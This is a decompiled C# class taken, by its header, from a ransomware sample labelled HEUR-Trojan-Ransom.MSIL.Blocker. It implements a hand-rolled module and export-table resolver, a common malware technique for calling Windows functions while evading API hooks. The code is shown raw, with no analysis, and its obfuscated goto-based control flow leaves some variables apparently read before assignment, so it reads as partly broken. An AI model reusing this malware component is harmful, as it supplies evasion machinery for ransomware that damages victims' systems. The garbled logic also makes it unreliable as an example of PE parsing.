// Decompiled with JetBrains decompiler
// Type: WindowsFormsApp1.CustomLoadLibrary
// Assembly: IMG_203_65_00201, Version=0.0.52.0, Culture=neutral, PublicKeyToken=null
// MVID: 512F8E1C-65FA-4A08-85E3-C51B3E89D23E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-9c36f6b8763377e8d99e2977ab75a9e8395fc76c0bef9452ce04256a388ad2d9.exe

using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace WindowsFormsApp1
{
  public class CustomLoadLibrary
  {
    public static IntPtr GetLoadedModuleAddress(string DLLName)
    {
      ProcessModuleCollection modules = Process.GetCurrentProcess().Modules;
      IntPtr loadedModuleAddress;
      IntPtr zero;
      do
      {
        IEnumerator enumerator = modules.GetEnumerator();
        try
        {
label_6:
          int num;
          for (int index = enumerator.MoveNext() ? 1 : 0; index != 0; index = num)
          {
            ProcessModule current = (ProcessModule) enumerator.Current;
            if (true)
            {
              num = current.FileName.ToLower().EndsWith(DLLName.ToLower()) ? 1 : 0;
              if (true)
              {
                if (num != 0)
                {
                  loadedModuleAddress = current.BaseAddress;
                  goto label_15;
                }
                else
                {
                  if (false)
                    break;
                  goto label_6;
                }
              }
            }
            else
              goto label_15;
          }
        }
        finally
        {
          if (enumerator is IDisposable disposable)
            disposable.Dispose();
        }
        zero = IntPtr.Zero;
        if (true)
          loadedModuleAddress = zero;
        else
          goto label_14;
      }
      while (false);
      goto label_15;
label_14:
      return zero;
label_15:
      return loadedModuleAddress;
    }

    public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
    {
      IntPtr num1 = IntPtr.Zero;
      try
      {
        long ptr1 = ModuleBase.ToInt64() + 60L;
        if (false)
          goto label_5;
        else
          goto label_19;
label_4:
        int num2;
        int num3 = num2;
        int num4;
        Marshal.ReadInt32((IntPtr) (ModuleBase.ToInt64() + (long) num4 + 20L));
        ptr1 = ModuleBase.ToInt64() + (long) num4;
label_5:
        int num5 = Marshal.ReadInt32((IntPtr) (ptr1 + 24L));
        num2 = Marshal.ReadInt32((IntPtr) (ModuleBase.ToInt64() + (long) num4 + 28L));
        int num6;
        int num7;
        long ptr2;
        long num8;
        long num9;
        if (true)
        {
          num6 = num2;
          ptr2 = ModuleBase.ToInt64() + (long) num4 + 32L;
          if (true)
          {
            num7 = Marshal.ReadInt32((IntPtr) ptr2);
            long num10 = ModuleBase.ToInt64() + (long) num4;
            num9 = 36L;
            num8 = num10;
          }
          else
            goto label_11;
        }
        else
          goto label_4;
label_8:
        IntPtr ptr3 = (IntPtr) (num8 + num9);
label_9:
        int num11 = Marshal.ReadInt32(ptr3);
        int num12 = 0;
        goto label_17;
label_11:
        long num13 = (long) Marshal.ReadInt32((IntPtr) (ModuleBase.ToInt64() + (long) num7 + (long) (num12 * 4)));
        ptr3 = (IntPtr) (ptr2 + num13);
        if (true)
        {
          if (!(Marshal.PtrToStringAnsi(ptr3).ToLower() == ExportName.ToLower()))
          {
            ++num12;
            goto label_17;
          }
        }
        else
          goto label_9;
label_13:
        num8 = ModuleBase.ToInt64() + (long) num11;
        num9 = (long) (num12 * 2);
        int num14;
        long num15;
        long num16;
        if (true)
        {
          num14 = (int) Marshal.ReadInt16((IntPtr) (num8 + num9)) + num3;
          num15 = ModuleBase.ToInt64();
          num16 = (long) num6;
        }
        else
          goto label_8;
label_15:
        int num17 = Marshal.ReadInt32((IntPtr) (num15 + num16 + (long) (4 * (num14 - num3))));
        num1 = (IntPtr) ((long) ModuleBase + (long) num17);
        goto label_22;
label_17:
        int num18 = num12 < num5 ? 1 : 0;
label_18:
        if (num18 != 0)
        {
          ptr2 = ModuleBase.ToInt64();
          goto label_11;
        }
        else
          goto label_22;
label_19:
        int num19 = Marshal.ReadInt32((IntPtr) ptr1);
        if (false)
        {
          num18 = num19;
          goto label_18;
        }
        else
        {
          int num20 = num19;
          Marshal.ReadInt16((IntPtr) (ModuleBase.ToInt64() + (long) num20 + 20L));
          long ptr4 = ModuleBase.ToInt64() + (long) num20 + 24L;
          bool flag = Marshal.ReadInt16((IntPtr) ptr4) == (short) 267;
          if (true)
          {
            num4 = Marshal.ReadInt32((IntPtr) (!flag ? ptr4 + 112L : ptr4 + 96L));
            long num21 = ModuleBase.ToInt64() + (long) num4;
            long num22 = 16;
            if (true)
            {
              num2 = Marshal.ReadInt32((IntPtr) (num21 + num22));
              goto label_4;
            }
            else
            {
              num16 = num22;
              num15 = num21;
              goto label_15;
            }
          }
          else
            goto label_13;
        }
      }
      catch
      {
        throw new InvalidOperationException("Failed to parse module exports.");
      }
label_22:
      return !(num1 == IntPtr.Zero) ? num1 : throw new MissingMethodException(ExportName + ", export not found.");
    }
  }
}
